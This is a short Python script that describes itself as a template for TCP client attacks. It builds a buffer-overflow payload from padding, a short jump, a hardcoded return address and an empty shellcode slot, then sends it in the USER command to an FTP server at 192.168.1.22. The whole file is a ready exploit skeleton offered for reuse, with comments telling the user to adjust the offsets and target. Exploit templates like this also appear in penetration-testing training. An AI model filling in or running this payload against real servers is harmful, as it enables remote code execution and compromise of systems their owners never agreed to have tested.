#!/usr/bin/python

# Template for TCP client attacks.

import socket
import struct

# Shellcode goes here
shellcode = ()

# Padding - adjust accordingly
nops = "\x41" * 50

# Pack the address in little-endian - adjust name accordingly
esi = struct.pack('<I', 0x7E45AE4E)

# Adjust payload structure accordingly
payload = nops + "\xEB\x06" + "B" * 2 + esi + shellcode + "B" * 205

# TCP socket - adjust accordingly, can be IP or domain name
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.22',21))
response = s.recv(1024)
print response

# Sample FTP vulnerability attack
s.send('USER ' + payload + '\r\n')
response = s.recv(1024)
print response

s.close()

